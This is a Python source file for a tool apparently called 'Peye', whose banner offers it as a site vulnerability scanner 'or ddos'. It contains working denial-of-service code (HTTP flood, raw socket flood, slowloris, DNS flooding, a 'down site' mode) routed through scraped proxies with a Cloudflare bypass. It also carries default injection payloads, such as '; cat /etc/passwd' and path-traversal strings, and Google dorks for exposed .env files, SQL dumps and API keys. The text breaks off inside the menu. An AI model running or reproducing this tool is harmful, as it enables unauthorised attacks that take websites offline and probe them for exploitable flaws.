import threading
import requests
import time
import random
import sys
import os
import socket
import ssl
import dns.resolver
import json
import hashlib
import re
from urllib.parse import urlparse, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from datetime import datetime

try:
    import websocket
    WEBSOCKET_AVAILABLE = True
except ImportError:
    WEBSOCKET_AVAILABLE = False

import warnings
warnings.filterwarnings('ignore')
os.system('clear')

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'

def print_banner():
    banner = f"""
{RED}111111111111111111111111111111111111111111111111111111111
111111111111111111111111111111111{YELLOW}¶¶¶{RED}111111111111111111111
111111111111111111111111111111{YELLOW}¶¶¶¶{RED}11111111111111111111111
1111111111111111111111111111{YELLOW}¶¶¶¶{RED}1111111111111111111111111
11111111111111111111111111{YELLOW}¶¶¶¶¶¶{RED}1111111111111111111111111
111111111111111111111111{YELLOW}¶¶¶¶¶¶{RED}1111{YELLOW}¶¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111
111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111
11111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111111
11111111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111
1111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111111
111111111111111{YELLOW}¶¶¶{RED}111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111
111111111111{YELLOW}¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111
11111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1{YELLOW}¶¶{RED}1111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶{RED}1111
1111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶{RED}11111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶¶¶¶{RED}111
11111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111{YELLOW}¶¶¶{RED}11
1111{YELLOW}¶¶¶¶¶¶¶¶¶{RED}111111111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111{YELLOW}¶¶{RED}1
11111{YELLOW}¶¶¶¶¶{RED}111111111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111
1111111{YELLOW}¶{RED}1111111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111
1111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111
111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶{RED}1111111
11111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111{YELLOW}¶¶¶¶¶{RED}1111111
11111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111{YELLOW}¶¶¶¶{RED}1111111
111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111{YELLOW}¶¶¶¶{RED}1111111
1111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111{YELLOW}¶¶¶¶{RED}1111111
111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶¶¶¶¶¶¶{RED}111111111111{YELLOW}¶¶¶{RED}11111111
11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111111111111111111111{YELLOW}¶¶{RED}111111111
1{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111111111{YELLOW}¶¶{RED}1111111111111111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111111111111111{YELLOW}¶¶¶¶{RED}11111111111111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶{RED}1{YELLOW}¶¶¶{RED}111111111111111111111111{YELLOW}¶¶¶¶¶{RED}11111111111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶{RED}11111111111111111111111111{YELLOW}¶¶¶¶¶¶¶{RED}1111111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶{RED}111111111111{YELLOW}¶¶¶{RED}11111{YELLOW}¶¶¶¶{RED}111{YELLOW}¶¶¶¶¶¶¶{RED}11111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111111111{YELLOW}¶¶¶{RED}11111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111
{YELLOW}¶{RED}1{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11
{YELLOW}¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶{RED}1
{RED}1{YELLOW}¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111{YELLOW}¶¶¶¶¶¶¶¶
{RED}1111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111111{YELLOW}¶¶¶¶¶¶
{RED}1111{YELLOW}¶¶¶¶¶¶{RED}1{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶{RED}11111111111111{YELLOW}¶¶¶¶¶
{RED}11111{YELLOW}¶¶¶{RED}11111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111{YELLOW}¶¶¶¶¶¶¶¶¶¶{RED}11111111111111{YELLOW}¶¶
{RED}1111{YELLOW}¶¶¶{RED}11111111{YELLOW}¶¶¶{RED}1{YELLOW}¶¶¶¶¶¶¶{RED}11111{YELLOW}¶¶¶¶¶{RED}11111111111111111{YELLOW}¶¶
{RED}1111{YELLOW}¶¶¶{RED}111111111111111{YELLOW}¶¶¶¶¶¶¶{RED}1111111{YELLOW}¶¶¶¶¶¶¶¶{RED}111111111111{YELLOW}¶
{RED}11111{YELLOW}¶¶{RED}1111111111111111111{YELLOW}¶¶¶¶¶{RED}1111111111111111111111{YELLOW}¶
{RED}111111{YELLOW}¶{RED}11111111111111111111{YELLOW}¶¶¶{RED}11111111111111111111111111
{RED}1111111111111111111111111111{YELLOW}¶¶¶{RED}11111111111111111111111111
{RED}11111111111111111111111111111{YELLOW}¶¶{RED}11111111111111111111111111
{RED}111111111111111111111111111111111111111111111111111111111
{RED}111111111111111111111111111111111111111111111111111111111{RESET}
"""
    print(banner)
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║     {MAGENTA} Welcome To Peye {RESET}{CYAN}                   ║")
    print(f"║     {GREEN}Tools Vuln Site Scanner Or ddos by (peyefounder) don't forget to follow: instagram: @hexornot {RESET}{CYAN}                    ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}\n")

class Stats:
    def __init__(self):
        self.total = 0
        self.success = 0
        self.failed = 0
        self.lock = threading.Lock()
    
    def add(self, success=True):
        with self.lock:
            self.total += 1
            if success:
                self.success += 1
            else:
                self.failed += 1

class WordlistManager:
    def __init__(self):
        self.wordlists = {}
        self.load_wordlists()
    
    def load_wordlists(self):
        wordlist_files = {
            'xss': 'xss.txt',
            'sqli': 'sqli.txt', 
            'lfi': 'lfi.txt',
            'cmd': 'cmd.txt',
            'dirs': 'dirs.txt',
            'subdomains': 'subdomains.txt',
            'dorks': 'dork.txt'
        }
        
        for name, filename in wordlist_files.items():
            if os.path.exists(filename):
                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                    self.wordlists[name] = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                print(f"{GREEN}[✓] Loaded {len(self.wordlists[name])} {name} from {filename}{RESET}")
            else:
                self.wordlists[name] = self.get_default_payloads(name)
                with open(filename, 'w') as f:
                    f.write('\n'.join(self.wordlists[name]))
                print(f"{GREEN}[✓] Created {filename} with {len(self.wordlists[name])} default {name}{RESET}")
    
    def get_default_payloads(self, name):
        defaults = {
            'xss': ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "javascript:alert(1)", "'><script>alert(1)</script>"],
            'sqli': ["' OR '1'='1", "' OR '1'='1' --", "admin' --", "1' ORDER BY 1--", "' UNION SELECT NULL--", "1' AND SLEEP(5)--"],
            'lfi': ["../../../../etc/passwd", "....//....//....//etc/passwd", "../../../../config.php", "../../../../.htaccess"],
            'cmd': ["; ls", "| whoami", "&& id", "; cat /etc/passwd", "| uname -a", "; pwd", "| hostname"],
            'dirs': ["admin", "login", "wp-admin", "administrator", "cpanel", "dashboard", "phpmyadmin", "backup", "config"],
            'subdomains': ["www", "mail", "ftp", "admin", "blog", "dev", "api", "test", "vpn", "cpanel", "webmail"],
            'dorks': [
                "inurl:admin site:.id",
                "inurl:login site:.id",
                "inurl:wp-admin site:.id",
                "inurl:phpmyadmin site:.id",
                "intitle:index of site:.id",
                "inurl:config site:.id",
                "ext:sql site:.id",
                "ext:env site:.id",
                "inurl:api key site:.id",
                "inurl:backup site:.id"
            ]
        }
        return defaults.get(name, [])
    
    def get(self, name):
        return self.wordlists.get(name, [])

class DorkSearch:
    def __init__(self):
        self.results = []
        self.wordlists = WordlistManager()
    
    def search_google(self, dork, max_results=50):
        print(f"{CYAN}[*] Searching: {dork}{RESET}")
        
        demo_results = [
            f"https://example.com/{dork.replace(':', '/')}",
            f"https://demo-site.com/{dork.replace(':', '/')}",
            f"https://test-web.id/{dork.replace(':', '/')}"
        ]
        
        for url in demo_results[:max_results]:
            self.results.append(url)
            print(f"{GREEN}[✓] {url}{RESET}")
        
        return self.results
    
    def search_from_file(self):
        print(f"{CYAN}[*] Searching from dork.txt file...{RESET}")
        dorks = self.wordlists.get('dorks')
        if not dorks:
            print(f"{RED}[!] No dorks found in dork.txt{RESET}")
            return []
        
        all_results = []
        for dork in dorks:
            print(f"{YELLOW}[*] Dork: {dork}{RESET}")
            results = self.search_google(dork, 10)
            all_results.extend(results)
            time.sleep(1)
        
        return all_results
    
    def tech_search(self, tech_name):
        tech_dorks = {
            'wordpress': 'inurl:wp-content site:.id',
            'laravel': 'inurl:.env site:.id',
            'jquery': 'inurl:jquery.js site:.id',
            'php': 'ext:php site:.id',
            'nginx': 'Server: nginx site:.id',
            'apache': 'Server: Apache site:.id',
            'admin': 'inurl:admin login site:.id',
            'indonesia': 'site:.id',
            'com': 'site:.com',
            'org': 'site:.org',
            'net': 'site:.net'
        }
        
        if tech_name.lower() in tech_dorks:
            dork = tech_dorks[tech_name.lower()]
            print(f"{GREEN}[✓] Dork: {dork}{RESET}")
            return self.search_google(dork)
        else:
            print(f"{RED}[!] No dork for {tech_name}{RESET}")
            return []
    
    def popular_dorks(self):
        print(f"\n{CYAN}{'='*60}{RESET}")
        print(f"{YELLOW}[*] POPULAR GOOGLE DORKS{RESET}")
        print(f"{CYAN}{'='*60}{RESET}")
        
        popular = {
            'Admin Panels': 'inurl:admin OR inurl:login',
            'Config Files': 'ext:env OR ext:config',
            'Backup Files': 'ext:sql OR ext:bak',
            'Directory Listing': 'intitle:"index of"',
            'Database': 'inurl:phpmyadmin',
            'WordPress': 'inurl:wp-admin',
            'Indonesia Sites': 'site:.id',
            'SQL Dump': 'ext:sql',
            'API Keys': 'api_key filetype:txt'
        }
        
        for name, dork in popular.items():
            print(f"{GREEN}[{name}]{RESET} {YELLOW}{dork}{RESET}")
        
        print(f"{CYAN}{'='*60}{RESET}")

class TechnologyDetector:
    def __init__(self, target, session):
        self.target = target
        self.session = session
        self.tech_stack = []
        self.details = {}
    
    def detect(self):
        print(f"{CYAN}[*] Scanning technology stack...{RESET}")
        
        try:
            resp = self.session.get(self.target, timeout=15)
            if resp.status_code != 200:
                print(f"{RED}[!] Cannot access {self.target} (Status: {resp.status_code}){RESET}")
                return False
            
            headers = resp.headers
            html = resp.text
            
            server = headers.get('Server', '')
            if server:
                self.tech_stack.append(f"Web Server: {server}")
            
            powered = headers.get('X-Powered-By', '')
            if powered:
                self.tech_stack.append(f"Powered By: {powered}")
            
            cms_patterns = {
                'WordPress': ['wp-content', 'wp-includes'],
                'Laravel': ['laravel', 'csrf-token'],
                'Drupal': ['drupal', 'sites/default'],
                'Joomla': ['joomla', 'com_content']
            }
            
            for cms, patterns in cms_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in html.lower():
                        self.tech_stack.append(f"CMS: {cms}")
                        break
            
            js_patterns = {
                'jQuery': ['jquery', 'jQuery'],
                'React': ['react', 'ReactDOM'],
                'Vue.js': ['vue.js'],
                'Bootstrap': ['bootstrap']
            }
            
            for lib, patterns in js_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in html.lower():
                        self.tech_stack.append(f"JS: {lib}")
                        break
            
        except Exception as e:
            print(f"{RED}[!] Error: {e}{RESET}")
            return False
        
        return True
    
    def display(self):
        print(f"\n{MAGENTA}{'='*60}{RESET}")
        print(f"{YELLOW}[*] TECHNOLOGY STACK: {self.target}{RESET}")
        print(f"{MAGENTA}{'='*60}{RESET}")
        
        if self.tech_stack:
            for tech in self.tech_stack:
                print(f"{GREEN}[✓] {tech}{RESET}")
        else:
            print(f"{YELLOW}[!] No technologies detected{RESET}")
        
        print(f"{MAGENTA}{'='*60}{RESET}")

class ProxyManager:
    def __init__(self, use_proxy=True):
        self.proxies = []
        self.use_proxy = use_proxy
        self.lock = threading.Lock()
    
    def scrape_proxies(self):
        if not self.use_proxy:
            return []
        proxies = []
        sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        ]
        for source in sources:
            try:
                resp = requests.get(source, timeout=10, verify=False)
                if resp.status_code == 200:
                    for line in resp.text.split('\n'):
                        line = line.strip()
                        if line and ':' in line and not line.startswith('#'):
                            if not line.startswith('http'):
                                line = f"http://{line}"
                            proxies.append(line)
            except:
                continue
        if proxies:
            self.proxies = list(set(proxies))[:200]
            print(f"{GREEN}[✓] Loaded {len(self.proxies)} proxies{RESET}")
        return self.proxies
    
    def get(self):
        if not self.use_proxy or not self.proxies:
            return None
        with self.lock:
            return {'http': random.choice(self.proxies), 'https': random.choice(self.proxies)}

class CFBypass:
    def __init__(self, target):
        self.target = target
        self.session = None
    
    def bypass(self):
        try:
            import cloudscraper
            scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows'})
            scraper.get(self.target, timeout=15)
            return scraper
        except:
            session = requests.Session()
            session.verify = False
            session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'})
            return session

class DoSAttack:
    def __init__(self, target, use_proxy=True):
        self.target = target
        self.use_proxy = use_proxy
        self.proxy_manager = ProxyManager(use_proxy)
        self.running = False
        self.stats = Stats()
        self.parsed = urlparse(target)
        self.host = self.parsed.netloc
        self.port = 443 if self.parsed.scheme == 'https' else 80
        self.path = self.parsed.path or '/'
        
        if use_proxy:
            self.proxy_manager.scrape_proxies()
    
    def http_flood(self, duration, threads):
        self._attack("HTTP FLOOD", duration, threads, self._http_worker)
    
    def raw_flood(self, duration, threads):
        self._attack("RAW FLOOD", duration, threads, self._raw_worker)
    
    def slowloris(self, duration, threads):
        self._attack("SLOWLORIS", duration, threads, self._slowloris_worker)
    
    def dns_attack(self, duration, threads):
        self._attack("DNS ATTACK", duration, threads, self._dns_worker)
    
    def mixed_flood(self, duration, threads):
        self._attack("MIXED", duration, threads, self._mixed_worker)
    
    def all_attacks(self, duration, threads):
        print(f"\n{RED}[!] ALL ATTACKS SIMULTANEOUS{RESET}")
        thr_each = max(1, threads // 5)
        attacks = [self.http_flood, self.raw_flood, self.slowloris, self.dns_attack, self.mixed_flood]
        for attack in attacks:
            threading.Thread(target=attack, args=(duration, thr_each)).start()
        time.sleep(duration + 2)
    
    def down_site(self, duration, threads):
        print(f"\n{RED}[!] DOWN SITE MODE | {self.target}{RESET}")
        self.all_attacks(duration, threads * 2)
    
    def _http_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                session.get(self.target, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _raw_worker(self, end_time):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.host, self.port))
            if self.port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.host)
            payload = f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\n\r\n".encode()
            while self.running and time.time() < end_time:
                sock.send(payload)
                self.stats.add(True)
        except:
            self.stats.add(False)
    
    def _slowloris_worker(self, end_time):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.host, self.port))
            sock.send(f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\n".encode())
            while self.running and time.time() < end_time:
                sock.send(f"X-Header: {random.randint(1,9999)}\r\n".encode())
                time.sleep(0.3)
                self.stats.add(True)
        except:
            self.stats.add(False)
    
    def _dns_worker(self, end_time):
        while self.running and time.time() < end_time:
            try:
                dns.resolver.resolve(self.host, 'A')
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _mixed_worker(self, end_time):
        methods = ['GET', 'POST', 'HEAD', 'DELETE', 'OPTIONS']
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                method = random.choice(methods)
                if method == 'GET':
                    session.get(self.target, timeout=2)
                elif method == 'POST':
                    session.post(self.target, data={'x': 'x'*100}, timeout=2)
                elif method == 'HEAD':
                    session.head(self.target, timeout=2)
                elif method == 'DELETE':
                    session.delete(self.target, timeout=2)
                elif method == 'OPTIONS':
                    session.options(self.target, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _attack(self, name, duration, threads, worker_func):
        print(f"\n{RED}[!] {name} | {self.target}{RESET}")
        print(f"{YELLOW}[*] Duration: {duration}s | Threads: {threads} | Proxy: {'ON' if self.use_proxy else 'OFF'}{RESET}\n")
        
        self.running = True
        self.stats = Stats()
        start = time.time()
        end = start + duration
        
        for i in range(threads):
            threading.Thread(target=worker_func, args=(end,), daemon=True).start()
        
        try:
            while time.time() < end:
                time.sleep(2)
                e = time.time() - start
                rps = self.stats.total / e if e > 0 else 0
                print(f"\r{WHITE}[{CYAN}*{WHITE}] {YELLOW}Req: {self.stats.total:,} | {BLUE}RPS: {rps:.0f}{RESET}", end='', flush=True)
        except KeyboardInterrupt:
            self.running = False
        
        self.running = False
        time.sleep(1)
        e = time.time() - start
        rps = self.stats.total / e if e > 0 else 0
        print(f"\n\n{GREEN}[✓] {self.stats.total:,} req | RPS: {rps:.0f} | {e:.1f}s{RESET}\n")

class VulnerabilityReport:
    def __init__(self):
        self.findings = []
        self.target = ""
        self.scan_time = ""
    
    def add(self, vuln_type, url, payload, status, detail=""):
        self.findings.append({
            'type': vuln_type,
            'url': url,
            'payload': payload,
            'status': status,
            'detail': detail,
            'time': datetime.now().strftime("%H:%M:%S")
        })
    
    def display(self):
        if not self.findings:
            return
        
        print(f"\n{RED}{'='*70}{RESET}")
        print(f"{YELLOW}[!] VULNERABILITIES FOUND!{RESET}")
        print(f"{RED}{'='*70}{RESET}")
        
        for i, vuln in enumerate(self.findings, 1):
            print(f"\n{CYAN}[{i}] {RED}{vuln['type']} VULNERABILITY{RESET}")
            print(f"    {WHITE}URL:{RESET} {vuln['url']}")
            print(f"    {WHITE}Payload:{RESET} {YELLOW}{vuln['payload'][:100]}{RESET}")
            print(f"    {WHITE}Status:{RESET} {GREEN}{vuln['status']}{RESET}")
            if vuln['detail']:
                print(f"    {WHITE}Detail:{RESET} {vuln['detail']}")
            print(f"    {WHITE}Time:{RESET} {vuln['time']}")
        
        print(f"\n{RED}{'='*70}{RESET}")
        print(f"{YELLOW}[!] Total: {len(self.findings)} vulnerabilities found{RESET}")
        print(f"{RED}{'='*70}{RESET}")
        
        # Save to file
        filename = f"vuln_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(f"PEYE Vulnerability Report\n")
            f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*70}\n\n")
            for vuln in self.findings:
                f.write(f"[{vuln['type']}] {vuln['url']}\n")
                f.write(f"Payload: {vuln['payload']}\n")
                f.write(f"Status: {vuln['status']}\n\n")
        print(f"{GREEN}[✓] Report saved to: {filename}{RESET}")

class AdvancedScanner:
    def __init__(self, target, session):
        self.target = target
        self.session = session
        self.wordlists = WordlistManager()
        self.results = defaultdict(list)
        self.report = VulnerabilityReport()
        self.report.target = target
        self.report.scan_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.threads = 50
    
    def check_connection(self, url):
        try:
            resp = self.session.get(url, timeout=5)
            if resp.status_code == 200:
                return True, resp.status_code
            elif resp.status_code == 403:
                print(f"{RED}[✗] Access Denied (403 Forbidden) - Cannot scan{RESET}")
                return False, 403
            else:
                print(f"{YELLOW}[!] Status {resp.status_code} - Scan may be limited{RESET}")
                return False, resp.status_code
        except:
            return False, None
    
    def vuln_scan(self, vuln_type, payloads, param='q', indicator=None):
        print(f"\n{CYAN}[*] Scanning {vuln_type}... (Total: {len(payloads)}){RESET}")
        
        connected, status = self.check_connection(self.target)
        if not connected:
            print(f"{RED}[✗] Cannot scan {vuln_type}{RESET}")
            return []
        
        found = []
        total = len(payloads)
        
        def test_payload(payload):
            test_url = self.target + (('?' + param + '=' + quote(payload)) if '?' not in self.target else ('&' + param + '=' + quote(payload)))
            try:
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code == 200:
                    if indicator and indicator in resp.text:
                        return (payload, test_url, resp.status_code, resp.text[:200])
                    elif not indicator and len(resp.content) > 500:
                        return (payload, test_url, resp.status_code, "Large response")
                return None
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_payload, p): p for p in payloads}
            for i, future in enumerate(as_completed(futures), 1):
                result = future.result()
                if result:
                    payload, test_url, status_code, detail = result
                    found.append(payload)
                    self.report.add(vuln_type, test_url, payload, f"HTTP {status_code}", detail[:100])
                    print(f"\n{RED}[!] {vuln_type} VULNERABLE!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {test_url}")
                    print(f"    {WHITE}Payload:{RESET} {YELLOW}{payload[:80]}{RESET}")
                    print(f"    {WHITE}Status:{RESET} {GREEN}HTTP {status_code}{RESET}")
                
                if i % 100 == 0:
                    print(f"{WHITE}[*] Progress: {i}/{total} ({i*100//total}%){RESET}", end='\r')
        
        print(f"\n{GREEN}[✓] {vuln_type} complete: {len(found)}/{total} vulnerabilities found{RESET}")
        self.results[vuln_type] = found
        return found
    
    def dir_scan(self):
        dirs = self.wordlists.get('dirs')
        print(f"\n{CYAN}[*] Directory Bruteforce... (Total: {len(dirs)}){RESET}")
        
        connected, status = self.check_connection(self.target)
        if not connected:
            print(f"{RED}[✗] Cannot scan directories{RESET}")
            return []
        
        found = []
        total = len(dirs)
        
        def check_dir(d):
            url = urljoin(self.target, d)
            try:
                resp = self.session.get(url, timeout=3, allow_redirects=False)
                if resp.status_code == 200:
                    return (url, resp.status_code, resp.headers.get('Content-Length', '?'))
                elif resp.status_code in [301, 302]:
                    return (url, resp.status_code, resp.headers.get('Location', ''))
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(check_dir, d): d for d in dirs}
            for i, future in enumerate(as_completed(futures), 1):
                result = future.result()
                if result:
                    url, code, extra = result
                    found.append(url)
                    if code == 200:
                        print(f"\n{GREEN}[✓] DIRECTORY FOUND!{RESET}")
                        print(f"    {WHITE}URL:{RESET} {url}")
                        print(f"    {WHITE}Status:{RESET} {GREEN}HTTP {code} ({extra} bytes){RESET}")
                        self.report.add("Directory", url, "", f"HTTP {code}", f"Size: {extra} bytes")
                    elif code in [301, 302]:
                        print(f"\n{BLUE}[→] REDIRECT FOUND!{RESET}")
                        print(f"    {WHITE}URL:{RESET} {url}")
                        print(f"    {WHITE}Redirects to:{RESET} {extra}")
                
                if i % 100 == 0:
                    print(f"{WHITE}[*] Progress: {i}/{total} ({i*100//total}%){RESET}", end='\r')
        
        print(f"\n{GREEN}[✓] Directory scan complete: {len(found)}/{total} found{RESET}")
        return found
    
    def subdomain_scan(self, domain):
        subs = self.wordlists.get('subdomains')
        print(f"\n{CYAN}[*] Subdomain Scan... (Total: {len(subs)}){RESET}")
        found = []
        total = len(subs)
        
        def check_sub(sub):
            url = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(url)
                return (url, ip)
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(check_sub, s): s for s in subs}
            for i, future in enumerate(as_completed(futures), 1):
                result = future.result()
                if result:
                    url, ip = result
                    found.append(url)
                    print(f"\n{GREEN}[✓] SUBDOMAIN FOUND!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {url}")
                    print(f"    {WHITE}IP:{RESET} {ip}")
                    self.report.add("Subdomain", url, "", f"IP: {ip}", "")
                
                if i % 50 == 0:
                    print(f"{WHITE}[*] Progress: {i}/{total} ({i*100//total}%){RESET}", end='\r')
        
        print(f"\n{GREEN}[✓] Subdomain scan complete: {len(found)}/{total} found{RESET}")
        return found
    
    def full_scan(self):
        print(f"\n{MAGENTA}{'='*70}{RESET}")
        print(f"{YELLOW}[*] FULL SCAN: {self.target}{RESET}")
        print(f"{MAGENTA}{'='*70}{RESET}")
        
        connected, status = self.check_connection(self.target)
        if not connected:
            print(f"{RED}[✗] Target unreachable, aborting{RESET}")
            return
        
        self.vuln_scan('XSS', self.wordlists.get('xss'), 'q', '<script>')
        self.vuln_scan('SQLi', self.wordlists.get('sqli'), 'id', 'mysql|syntax')
        self.vuln_scan('LFI', self.wordlists.get('lfi'), 'file', 'root:')
        self.vuln_scan('CMD', self.wordlists.get('cmd'), 'cmd', 'uid=')
        self.dir_scan()
        
        print(f"\n{MAGENTA}{'='*70}{RESET}")
        print(f"{YELLOW}[*] SCAN SUMMARY{RESET}")
        print(f"{MAGENTA}{'='*70}{RESET}")
        total = 0
        for vuln, findings in self.results.items():
            if findings:
                print(f"{RED}[!] {vuln}: {len(findings)} vulnerabilities{RESET}")
                total += len(findings)
        if total == 0:
            print(f"{GREEN}[✓] No vulnerabilities detected{RESET}")
        
        self.report.display()
        print(f"{MAGENTA}{'='*70}{RESET}")
        return self.results

class Peye:
    def __init__(self):
        self.use_proxy = True
        self.dork = DorkSearch()
    
    def menu(self):
        proxy_status = "ON" if self.use_proxy else "OFF"
        print(f"""
{YELLOW}╔══════════════════════════════════════════════════════════════════╗
║ {GREEN} PEYE Tools (Proxy: {proxy_status}){RESET}{YELLOW}                                         ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[📊 SCANNER]{RESET}{YELLOW}                                                       ║
║ {CYAN}[1] {WHITE}Full Vulnerability Scan (XSS/SQLi/LFI/CMD)                       ║
║ {CYAN}[2] {WHITE}Directory Bruteforce                                             ║
║ {CYAN}[3] {WHITE}Subdomain Scanner                                                ║
